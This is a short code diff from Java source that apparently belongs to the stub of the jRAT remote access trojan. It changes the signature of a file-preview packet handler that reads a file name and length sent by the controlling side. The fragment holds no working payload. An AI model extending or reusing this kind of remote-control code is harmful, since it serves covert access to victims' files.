@@ -11,7 +11,7 @@ import se.jrat.stub.packets.outgoing.Packet42FilePreview;
 public class Packet60PreviewFile extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String file = Connection.instance.readLine();
 		int l = Connection.instance.readInt();
 		int readed = 0;
